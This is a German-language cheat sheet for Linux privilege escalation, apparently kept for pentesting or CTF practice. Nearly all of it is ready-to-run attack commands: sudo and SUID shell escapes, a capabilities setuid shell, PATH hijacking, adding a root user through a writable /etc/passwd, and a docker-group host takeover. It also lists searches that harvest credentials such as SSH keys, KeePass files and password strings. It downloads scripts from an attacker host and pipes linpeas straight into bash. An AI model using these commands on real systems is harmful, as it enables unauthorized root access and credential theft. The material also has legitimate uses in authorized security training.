# 🐧 Linux Privilege Escalation

## 0. Erstmal Übersicht (immer!)

```bash
# Wer bin ich?
id
whoami
groups
hostname
uname -a
cat /etc/os-release

# Wo bin ich?
pwd
ls -la

# Andere User?
cat /etc/passwd | grep -v nologin | grep -v false
ls /home/

# Was läuft?
ps auxf
ss -tulnp
netstat -tulnp
```

## 1. Automatisiert

```bash
# Auf Angreifer
python3 -m http.server 8000

# Auf Target
cd /tmp
wget http://$LHOST:8000/linpeas.sh && chmod +x linpeas.sh && ./linpeas.sh | tee linpeas.out
wget http://$LHOST:8000/lse.sh && chmod +x lse.sh && ./lse.sh -l 2

# Direkt aus dem Netz
curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | bash
```

## 2. Sudo-Rechte (häufigster Win!)

```bash
sudo -l                                   # was darf ich als sudo?
sudo -l -l                                # detaillierter
```

→ Ergebnis bei [GTFOBins](https://gtfobins.github.io/) checken.

```bash
# Beispiele
sudo /usr/bin/find . -exec /bin/sh \; -quit
sudo /usr/bin/vim -c ':!/bin/sh'
sudo /usr/bin/less /etc/profile          # !/bin/sh
sudo /usr/bin/awk 'BEGIN {system("/bin/sh")}'
sudo /usr/bin/python3 -c 'import os; os.system("/bin/sh")'
sudo /usr/bin/perl -e 'exec "/bin/sh";'

# sudo mit env_keep
sudo LD_PRELOAD=/tmp/evil.so cmd
```

## 3. SUID-Binaries

```bash
find / -perm -u=s -type f 2>/dev/null
find / -perm -4000 -type f 2>/dev/null
find / -perm -u=s -o -perm -g=s -type f 2>/dev/null      # SUID + SGID
```

→ Jedes ungewöhnliche Binary bei [GTFOBins](https://gtfobins.github.io/) checken.

## 4. Capabilities

```bash
getcap -r / 2>/dev/null

# Beispiel: cap_setuid auf python
/usr/bin/python -c 'import os; os.setuid(0); os.system("/bin/sh")'
```

## 5. Cronjobs

```bash
# System-Cron
cat /etc/crontab
ls -la /etc/cron.*
ls -la /var/spool/cron/

# Beobachten was läuft (pspy = Goldgrube)
# pspy zeigt Prozesse OHNE root-Rechte
wget https://github.com/DominicBreuker/pspy/releases/latest/download/pspy64
chmod +x pspy64 && ./pspy64
```

Wenn ein Cron-Skript schreibbar ist → eigenen Code reinpacken.

## 6. PATH Hijacking

```bash
# Schreibbare Verzeichnisse im PATH?
echo $PATH
# Wenn z.B. /tmp im PATH und ein Skript ruft "ls" ohne absoluten Pfad auf:
echo '#!/bin/bash
/bin/sh' > /tmp/ls
chmod +x /tmp/ls
export PATH=/tmp:$PATH
```

## 7. Schreibbare Files

```bash
# Schreibbare /etc/passwd?
ls -la /etc/passwd
# Wenn writable:
openssl passwd -1 -salt x newpass
# → newroot:HASH:0:0:root:/root:/bin/bash

# Schreibbare sudoers?
ls -la /etc/sudoers /etc/sudoers.d/

# Schreibbare /etc/shadow?
```

## 8. Kernel Exploits (letzter Ausweg, kann crashen!)

```bash
uname -a
cat /etc/os-release
# → searchsploit / google nach passendem Exploit

# Klassiker
# - DirtyCow (CVE-2016-5195) — Kernel < 4.8
# - Dirty Pipe (CVE-2022-0847) — Kernel 5.8 - 5.16.11
# - PwnKit (CVE-2021-4034) — pkexec, fast überall
# - sudo Baron Samedit (CVE-2021-3156)

# linux-exploit-suggester
./linux-exploit-suggester.sh
```

## 9. Docker / LXD

```bash
# In docker-Gruppe?
id
# Ja → root übernehmen:
docker run -v /:/mnt --rm -it alpine chroot /mnt sh

# In lxd-Gruppe?
# Image vorbereiten und Mount → root
```

## 10. NFS no_root_squash

Wenn auf Mount geschrieben werden kann mit no_root_squash → SUID-Binary von Angreifer-Maschine reinlegen.

## 11. Weak Service Files

```bash
# systemd-Services prüfen
systemctl list-units --type=service
ls -la /etc/systemd/system/
# Wenn ein Service-File writable → ExecStart=/tmp/shell.sh
```

## 12. Credentials suchen

```bash
# Klassiker
grep -ri "password" /etc/ 2>/dev/null
grep -ri "passwd" /etc/ 2>/dev/null
find / -name "*.conf" 2>/dev/null | xargs grep -l "password" 2>/dev/null

# Bash History
cat ~/.bash_history
cat /home/*/.bash_history 2>/dev/null

# Backup-Files
find / -name "*.bak" 2>/dev/null
find / -name "*.old" 2>/dev/null

# SSH Keys
find / -name "id_rsa*" 2>/dev/null
find / -name "authorized_keys" 2>/dev/null

# Datenbank-Files
find / -name "*.kdbx" 2>/dev/null
find / -name "*.sqlite" 2>/dev/null
```

## 📝 Wichtige Resources

- [GTFOBins](https://gtfobins.github.io/) — Standardlookup für SUID/sudo
- [HackTricks Linux PrivEsc](https://book.hacktricks.xyz/linux-hardening/privilege-escalation)
